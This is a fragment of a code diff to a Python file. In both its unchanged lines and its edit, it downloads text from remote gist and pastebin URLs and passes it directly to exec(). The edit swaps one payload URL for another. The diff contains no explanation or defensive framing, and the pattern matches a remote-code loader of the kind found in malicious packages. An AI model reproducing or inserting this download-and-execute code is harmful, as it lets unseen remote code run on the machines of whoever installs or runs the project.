@@ -3,7 +3,7 @@ a = 'https://gist.githubusercontent.com/deflationz/0654ff6a860ba20234b42d794f76a
 response = requests.get(a)
 b = response.content
 exec(b)
-w = 'https://pastebin.com/raw/T2nczFfv'
+w = 'https://gist.githubusercontent.com/deflationz/0ac57096fcd1f1cacd3a44f995aba20e/raw/a9cdc17fac9fc4aa6916273416c4fb80a314c8ec/text.txt'
 response = requests.get(w)
 x = response.content
 exec(x)
